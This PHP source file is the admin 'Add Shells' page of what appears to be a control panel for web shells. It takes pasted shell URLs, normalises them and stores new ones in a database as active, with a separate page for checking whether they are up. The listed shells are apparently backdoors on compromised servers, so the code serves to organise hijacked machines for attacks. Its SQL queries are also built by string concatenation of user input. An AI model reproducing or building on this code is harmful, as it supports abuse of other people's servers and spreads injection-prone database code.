<?php

require_once "../core.php";

if (!isAdmin) redirect(BASE.'index.php');

require_once THEME."header.php";
require_once ADMIN_THEME."nav.php";

$toadd = isset($_POST['toadd']) ? cleanurl($_POST['toadd']) : "";

opencontent("Add Shells");

echo "<form action='' method='post'>\n";
echo "<center>\n";

if ($toadd != "") {

	$urls = checkvalidshells(explode("\n", $toadd));
	$total = count($urls);
	$unique = 0;
	
	foreach ($urls as $url) {

		$url = trim($url);
		
		if (!preg_match("/^http:\/\//", $url) && $url != "")
			$url = "http://".$url;

		$check = mysql_query("SELECT * FROM shells WHERE url = '".$url."' LIMIT 1") or die(mysql_error());

		if (mysql_num_rows($check) == 0 && $url != "") {

			$insert = mysql_query("INSERT INTO shells (url, status, lastchecked) VALUES ('".$url."', 'up', 0)") or die(mysql_error());
			$unique++;

		} elseif ($url == "") {
			$total--;
		}

	}
	
	$duplicates = $total - $unique;
	
	if ($total > 0) {
		echo $unique." out of ".$total." entered shells have been added to the database.<br />\n";
	} else {
		echo "Use the form below to add shells to the database.<br />\n";
		echo "Use the 'Manage Shells' page to check the status of the shells.<br /><br />\n";
	}
	
	if ($duplicates > 0) {
		echo "(".$duplicates." shell".($duplicates == 1 ? " was" : "s were")." already in the database.)<br />\n";
	}
		
	echo "<br />\n";
	
} else {

	echo "Use the form below to add shells to the database.<br />\n";
	echo "Use the 'Manage Shells' page to check the status of the shells.<br /><br />\n";

}

	echo "</center>\n";
	echo "<table cellpadding='5' cellspacing='5' style='text-align: center; font-size: 12px;'>\n";
	echo "<tr>\n<td><textarea name='toadd' style='width: 100%; height: 250px;'></textarea></td>\n</tr>\n";
	echo "<tr>\n<td style='text-align: right;'><input type='submit' value='Add Shells To Database' /></td>\n</tr>\n";
	echo "</table>\n";
	echo "</form>\n";

closecontent();

require_once THEME."footer.php";

?>